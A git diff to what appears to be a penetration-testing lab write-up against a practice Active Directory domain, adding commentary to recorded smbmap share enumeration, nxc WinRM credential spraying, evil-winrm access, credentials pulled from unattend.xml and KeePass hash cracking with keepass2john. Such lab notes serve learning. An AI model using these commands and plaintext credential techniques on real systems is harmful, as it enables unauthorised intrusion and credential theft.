@@ -1798,7 +1798,8 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\back
 
 useless account (see if if its worth keeping)
 
-ssmalls is member 
+ssmalls is member of IT admin groups, enumerating shares again as this user reveals a powershell script under the IT share:
+
 ```bash
 smbmap -u ssmalls -p Password123! -H 172.16.8.3 -r 'Department Shares' --depth 5
 
@@ -1880,6 +1881,8 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
         SYSVOL                                                  READ ONLY       Logon server share 
 [*] Closed 1 connections                                                                             
 ```
+
+Downloading and readint the script:
 
 ```bash
 smbclient -U ssmalls "//172.16.8.3/Department Shares" --password='Password123!'
@@ -2020,6 +2023,8 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\back
 
 ```
 
+Account creds work con MS01 for winrm access:
+
 ```bash
  nxc winrm 172.16.8.0/24 -u backupadm -p '!qazXSW@'
 WINRM       172.16.8.3      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) 
@@ -2034,6 +2039,8 @@ WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\back
 ```bash
  evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
 ```
+
+Searching in the c:\ directory discloses a directory and two files:
 
  ```bash
  *Evil-WinRM* PS C:\Users\backupadm\Desktop> cd c:\
@@ -2067,6 +2074,8 @@ Mode                LastWriteTime         Length Name
 -a----         6/1/2022   2:17 PM           6995 unattend.xml
 
  ```
+
+Found creds:
 
 ```
 <?xml version="1.0" encoding="utf-8"?>
@@ -2183,6 +2192,10 @@ Mode                LastWriteTime         Length Name
 
 ```
 
+ilfserveradm:Sys26Admin
+
+Downloading the files:
+
 ```
 *Evil-WinRM* PS C:\> download budget_data.xlsx
                                         
@@ -2197,6 +2210,8 @@ Info: Download successful!
 *Evil-WinRM* PS C:\> 
 
 ```
+
+Converting into crackable format and cracking both:
 
 ```
 keepass2john Inlanefreight.kdbx > Inlanefreight.hash
@@ -2239,6 +2254,15 @@ Session completed.
 
 ```
 
+budget_data.xlsx
+
+![](./ms01/1.png)
+
+Inlanefreight.kdbx
+
+![](./ms01/2.png)
+
+However both are useless.
 ## RDP access
 
 ```
